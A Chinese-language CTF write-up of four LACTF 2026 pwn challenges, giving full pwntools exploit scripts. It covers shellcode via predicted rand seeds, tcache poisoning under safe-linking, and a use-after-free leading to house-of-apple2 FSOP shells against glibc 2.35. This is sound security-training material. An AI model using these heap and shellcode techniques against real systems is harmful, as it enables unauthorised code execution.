---
title: LACTF2026-pwn 个人题解
date: 2026-02-11 02:38:00
tags: 
    - pwn
    - LACTF2026
    - WriteUp
categories: Contest
---
## tic-tac-no

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/main.png)

井字棋

#### playerMove

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/playerMove.png)

数组越界写

#### checkWin

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/checkWin.png)

相同字符就胜利

#### bss

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/bss.png)

越界写把电脑的棋子变成自己的就行了，脚本都不用写

## ScrabASM

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/main.png)

#### swap_tile

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/swap_tile.png)

#### play

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/play.png)

其实就是执行随机生成的 shellcode ，但可以更换任意字节为随机字节

### 攻击思路

由于 srand 以时间作种子，可以考虑在同时运行本地随机数生成程序和攻击脚本以预测随机数，进而控制 shellcode

且由于只有 15 字节的空间，我们可以先执行 read shellcode 再自行写入提权 shellcode

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/reg.png)

(这张图片用了队友 ItsFlicker 的，懒得自己再截了)

```
add al,  0xd
push rax
pop rsi
xor edi, edi
push rdi
pop rax
mov dl, 0xf0
syscall

{ 0x04, 0x0D, 0x50, 0x5E, 0x31, 0xFF, 0x57, 0x58, 0xB2, 0xF0, 0x0F, 0x05 }
```

### exp

#### c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    int t = time(0);
    srand(t + 2);
    FILE *fp = fopen("./beyond.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    srand(t);
    fp = fopen("./present.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    srand(t + 1);
    fp = fopen("./future.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    return 0;
}
```

#### python

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./chall')
else:
	io = remote('chall.lac.tf', 31338)

nowrd = []
prsrd = []
ftrrd = []
bydrd = []
tag = ''
nowstep = [0] * 14
rout = []
fag = [0] * 14
sc = ['04', '0d', '50', '5e', '48', '31', 'ff', '57', '58', 'b2', 'f0', '0f', '05']

def rdbt():
	global nowrd
	io.recvuntil(b'Your starting tiles:')
	for i in range(14):
		io.recvuntil(b'| ')
		nowrd.append(io.recv(2).decode('utf-8'))

def prsbt():
	global prsrd
	with open('present.txt', 'r', encoding = 'utf-8') as f:
		prsrd = f.read().split()

def ftrbt():
	global ftrrd
	with open('future.txt', 'r', encoding = 'utf-8') as f:
		ftrrd = f.read().split()

def bydbt():
	global bydrd
	with open('beyond.txt', 'r', encoding = 'utf-8') as f:
		bydrd = f.read().split()

def randswap():
	prepos = 13
	for nowpos in range(14, 1000):
		flag = 0
		op = 0
		for i in range(len(sc)):
			if sc[i] == nowrd[nowpos] and fag[i] == 0:
				flag = i
				fag[i] = 1
				op = 1
				break
		if op == 1:
			nowstep[flag] = nowpos - prepos
			prepos = nowpos
			rout.append(flag)
		if len(rout) == 14:
			break

def swapidx(idx):
	io.sendline(b'1')
	io.sendline(str(idx).encode())

def attack():
	global rout
	global nowstep
	global nowrd
	global tag
	rdbt()
	prsbt()
	ftrbt()
	bydbt()
	flag = 7
	for i in range(len(nowrd)):
		if nowrd[i] != prsrd[i]:
			flag = flag & 0b110
		if nowrd[i] != ftrrd[i]:
			flag = flag & 0b101
		if nowrd[i] != bydrd[i]:
			flag = flag & 0b011
	if flag == 1:
		tag = 'prs'
		nowrd = prsrd
	elif flag == 2:
		tag = 'prs'
		nowrd = ftrrd
	elif flag == 4:
		tag = 'prs'
		nowrd = bydrd
	print(tag)
	randswap()
	for i in rout:
		for _ in range(nowstep[i]):
			swapidx(i)
	io.sendlineafter(b'> ', b'2')
	mysc = shellcraft.sh()
	io.send(asm(mysc))
	io.interactive()

attack()
```

## tcademy

#### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/checksec.png)

保护全开

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/main.png)

菜单题

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/menu.png)

#### create_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/create_note.png)

只有两个槽位

#### delete_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/delete_note.png)

#### print_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/print_note.png)

puts 可以通过溢出泄露一些内容

#### get_note_index

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/get_note_index.png)

#### read_data_into_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/read_data_into_note.png)

此处有由整数溢出造成的堆溢出漏洞

### 攻击思路

glibc 版本为 2.35 ，是高版本，有 PIE 保护，没有 hook 函数可以劫持

所以考虑劫持某个 _IO_FILE 结构体用来 getshell ，在此之前应先 leak libc

可以通过 tcache poisoning 去把一个 chunk 放入 unsortedbin 中来实现 libc leak

在高版本 libc 中， tcache 劫持的要求会更加严格

首先是 safe-linking 机制，这需要还原泄露出的 next 指针，并且 key 的生成不再与堆地址相关，改为和 canary 类似的随机 8 字节数据

然后是分配 tcache 时的判断，决定 tcache 是否分配的标准由 entry 是否为空变为 counts 是否为 0 ，不能再简单粗暴地劫持 tcache_pthread_struct 就完事了

对于这道题目而言，更加棘手的是同时持有的 chunk 槽位只有两个，而想要通过 tcache poisoning 把目标地址写的权限拿到手至少需要持有两个该 tcache 的 chunk ，这需要我们修改 counts ，而在能够修改 counts 之前的 tcache_pthread_struct 劫持步骤，我们必须预先申请两个相同大小的 chunk 再放入 tcache 

而且还要注意不要破坏掉 size ，破坏了也要修复，不然 delete 的时候有你好受

在进行 unsortedbin 布置时我们采用了堆溢出修改 size 结合 counts 篡改的方式，这样可以在持有该 chunk 的情形下将其定位到 unsortedbin ，事后直接 free 即可，非常方便

还要注意一个小细节： tcache_pthread_struct 会被劫持也会被释放，这样的话前面的一些 counts 会变得比较奇怪，而且用于劫持 tcache_pthread_struct 的那个 tcache 会废掉，需要更换 size 做接下来的步骤

最后劫持 _IO_2_1_stdout_ 打 house_of_apple2 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 102

if debug:
	io = process('./chall_patched')
else:
	io = remote('chall.lac.tf', 31144)

libc = ELF('./libc.so.6')

def create(index, size, content):
	io.sendlineafter(b'Choice > ', b'1')
	io.sendlineafter(b'Index: ', str(index).encode())
	io.sendlineafter(b'Size: ', str(size).encode())
	io.sendafter(b'Data: ', content)

def delete(index):
	io.sendlineafter(b'Choice > ', b'2')
	io.sendlineafter(b'Index: ', str(index).encode())

def printnote(index):
	io.sendlineafter(b'Choice > ', b'3')
	io.sendlineafter(b'Index: ', str(index).encode())

def calcnext(ptr, pos):
	return (ptr // 0x1000) ^ pos

def attack():
	msize = 0x7
	nsize = 0xf8
	osize = 0xe8

	create(0, msize, b'\n')		# build arch
	create(1, nsize, b'\n')
	delete(0)
	delete(1)

	payload = b'A' * (0x20 - 1) + b'B'		# leak heap
	create(0, msize, payload)
	printnote(0)
	io.recvuntil(b'AB')
	heap = u64(io.recv(5).ljust(8, b'\x00')) * 0x1000
	log.info(f'heap = {hex(heap)}')
	delete(0)

	payload = b'A' * 0x18 + p64(0x101)		# fix up
	create(0, msize, payload)
	delete(0)
	create(0, nsize, b'\n')
	create(1, nsize, b'\n')
	delete(1)
	delete(0)
	
	toentry = calcnext(heap + 0x2c0, heap + 0x10)		# tcache_pthread_struct hijack
	payload = b'A' * 0x18 + p64(0x91) + p64(toentry).ljust(0x80, b'\x00') + p64(0x90) + p64(0x71)
	create(0, msize, payload)
	delete(0)
	create(0, nsize, '\n')
	payload = (p16(1) + p16(0) * 6 + p16(8)).ljust(0x80, b'\x00')
	create(1, nsize, payload)

	delete(0)		# into unsortedbin
	payload = b'A' * (0x20 - 1) + b'B'
	create(0, msize, payload)
	printnote(0)
	io.recvuntil(b'AB')
	libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x21ace0
	log.info(f'libc = {hex(libc.address)}')
	delete(0)

	payload = b'A' * 0x18 + p64(0x91) 	# fix up
	create(0, msize, payload)
	delete(0)
	delete(1)
	create(0, osize, b'\n')
	create(1, osize, b'\n')
	delete(1)
	delete(0)

	stdout = libc.sym['_IO_2_1_stdout_']		# stdout hijack
	payload = b'A' * 0x18 + p64(0x101) + p64(0) * 31 + p64(0x101) + p64(0) * 31 + p64(0xf1) + p64(calcnext(heap + 0x4c0, stdout))
	create(0, msize, payload)
	delete(0)
	create(0, osize, '\n')
	fake_io = flat({
			0x0: b"  sh;",
			0x28: libc.sym['system'],
			0x88: heap,
			0xA0: stdout - 0x40,
			0xD8: libc.sym['_IO_wfile_jumps'] - 0x20
		},
		filler=b"\x00"
	)
	log.info(f'stdout = {hex(stdout)}')
	create(1, osize, fake_io)
	io.interactive()

attack()
```

## ourUKLA

### code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_STUDENTS 10

#define UNDERGRAD 0x1
#define MASTERS 0x2
#define PHD 0x4
#define POSTDOC 0x8
#define HASNOLIFE 0x10
#define ACMCYBER 0x20

struct student_info {
    char noeditingmyptrs[0x10]; // No editing my pointers !!!
    char *name;
    unsigned long attributes;
    char major[0x40];
    char aux[0x90];
};
struct student {
    unsigned long array_id;
    unsigned long uid;
    struct student_info *sinfo;
};

struct student *ourUKLA[MAX_STUDENTS] = {0};
int cur_index = 0;

void menu() {
    puts("________________________________________________");
    puts("|                  ----------                  |");
    puts("|                ourUKLA v0.1.7                |");
    puts("|                  ----------                  |");
    puts("| 1. Add student                               |");
    puts("| 2. Get student info                          |");
    puts("| 3. Remove student                            |");
    puts("|______________________________________________|");
    puts("");
    printf("Option > ");
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    malloc(0x18);
    puts("Administrator, welcome to ourUKLA.");
    puts("This is the portal for the University of Kungkungkung LAhur.\n");
}

void fill_student_info(struct student *s) {

    struct student_info *sinfo;
    if (s->sinfo == NULL) sinfo = malloc(sizeof(struct student_info));
    else sinfo = s->sinfo;

    char *name = malloc(0x100);
    printf("Student name: ");
    read(STDIN_FILENO, name, 0x100);
    sinfo->name = name;

    printf("Student major: ");
    read(STDIN_FILENO, sinfo->major, 0x40);

    printf("Student attributes (e.g. undergrad = 1): ");
    scanf("%lu", &sinfo->attributes);
    while ((getchar()) != '\n');
    sinfo->attributes |= HASNOLIFE | ACMCYBER;

    printf("Require space to add aux data (y/n)? ");
    char res = getchar();
    getchar();
    if (res == 'y') {
        printf("Aux data: ");
        read(STDIN_FILENO, sinfo->aux, 0x90);
    }

    s->sinfo = sinfo;
}

void add_student() {

    char* old_top = *((char**)puts + (0x166580/8)) + 0x10;
    struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
    if ((void *)old_top == (void *)s) s->sinfo = NULL;

    s->array_id = cur_index++;
    cur_index %= MAX_STUDENTS;

    printf("Enter student UID: ");
    scanf("%ld", &s->uid);
    while ((getchar()) != '\n');

    printf("Enter student information now (y/n)? You can do it later: ");
    char res = getchar();
    getchar();
    if (res == 'y') fill_student_info(s);

    printf("Student with UID %lu added at index %lu!\n", s->uid, s->array_id);
}

void get_student_info() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < MAX_STUDENTS; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                puts("STUDENT INFO");
                printf("Student Name: %s\n", sinfo->name);
                printf("Student Major: %s\n", sinfo->major);
                printf("Student Attributes (number): %lu\n", sinfo->attributes);
            }
            return;
        }
    }
}

void remove_student() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < MAX_STUDENTS; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                free(sinfo->name);
                free(sinfo);
            }
            free(ourUKLA[i]);

            ourUKLA[i] = NULL;
            return;
        }
    }
}

int main() {
    
    init();

    int choice;
    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                add_student();
                break;
            case 2:
                get_student_info();
                break;
            case 3:
                remove_student();
                break;
            default:
                puts("cmon you're an administrator don't tell me you don't know how to follow basic instructions!!");
                exit(1);
        };
    }

    return 0;
}
```

菜单堆题，最多可以持有 10 个 chunk ，但可以无限申请

有关于 student-info 的 UAF

### 攻击思路

突破口在于 student-info 的 UAF ，当申请一个新的 student 时，若 s_info 不为空，则不重新申请

于是就可以利用这一点，在某个合适 chunk 中写入 leak 出的 _IO_list_all - 0x10 地址，然后把这个 chunk 放入 unsortedbin 中再进行若干次单采 student 使某一次恰好令 s_info = _IO_list_all - 0x10 ，如果此时选择填写 name 的话，刚好可以在 _IO_list_all 的位置上放上 name 指针，这也是一种任意地址写堆地址的原语

然而在达成原语之前需要先 leak heap 和 leak libc ，而 leak 过程会破坏堆的结构，使后续过程难以进行；因此我们可以先 malloc 至没有 freed chunk ，再重新布局

关于布局，核心思路就是：填满目标大小的 tcache ，从而创造出一个 unsortedbin chunk

最后 name 上打 house of apple2 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./chall_patched')
else:
	io = remote('chall.lac.tf', 31147)

libc = ELF('./libc.so.6')

def calc_real_next(next):
	ori = next
	for i in range(4):
		next = ori ^ (next >> 12)
	return next

def fill_student_info(name, major, attributes, yon, aux):
	io.sendafter(b'name: ', name)
	io.sendafter(b'major: ', major)
	
	io.sendlineafter(b'(e.g. undergrad = 1): ', str(attributes).encode())
	if yon:
		io.sendlineafter(b'(y/n)? ', b'y')
		io.sendafter(b'data: ', aux)
	else:
		io.sendlineafter(b'(y/n)? ', b'n')

def add_student(UID, info = False, name = b'', major = b'', attributes = b'', yon = False, aux = b''):
	io.sendlineafter(b'Option > ', b'1')
	io.sendlineafter(b'UID: ', str(UID).encode())
	if info:
		io.sendlineafter(b'later: ', b'y')
		fill_student_info(name, major, attributes, yon, aux)
	else:
		io.sendlineafter(b'later: ', b'n')

def get_student_info(UID):
	io.sendlineafter(b'Option > ', b'2')
	io.sendlineafter(b'UID: ', str(UID).encode())

def remove_student(UID):
	io.sendlineafter(b'Option > ', b'3')
	io.sendlineafter(b'UID: ', str(UID).encode())

def exit_fsop():
	io.sendlineafter(b'Option > ', b'4')

def attack():
	for i in range(10):		# init
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	for i in range(8):
		remove_student(i)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')

	get_student_info(0)		# leak heap
	io.recvuntil(b'Name: A')
	leak_next = u64(io.recv(5).ljust(8, b'\x00'))
	heap = (calc_real_next(leak_next) - 0x1e) * 0x100
	log.info(f'heap = {hex(heap)}')

	add_student(7)		# leak libc
	get_student_info(7)
	io.recvuntil(b'Name: ')
	libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x1e6c20
	log.info(f'libc = {hex(libc.address)}')
	fsop = libc.symbols['_IO_list_all'] - 0x10

	add_student(8)		# fix
	add_student(9)
	for i in range(14):
		add_student(i % 10)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	
	for i in range(7):		# init
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	payload = b'A' * 0x10 + p64(fsop)
	add_student(7, True, b'A', payload, b'A', True, b'A')
	add_student(8, True, b'A', b'A', b'A', True, b'A')
	add_student(9, True, b'A', b'A', b'A', True, b'A')
	for i in range(8):
		remove_student(i)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	add_student(7)
	add_student(8)
	
	fake_io_base = heap + 0x40b0		# house of apple2
	fake_io = flat({
			0x0: b"  sh;",
			0x28: 1,
			0x68: libc.sym['system'],
			0x88: fake_io_base + 0x1000,
			0xA0: fake_io_base,
			0xD8: libc.sym['_IO_wfile_jumps'],
			0xE0: fake_io_base
		},
		filler=b"\x00"
	)
	add_student(9, True, fake_io, b'A', b'A', True, b'A')
	
	exit_fsop()
	io.interactive()

attack()
```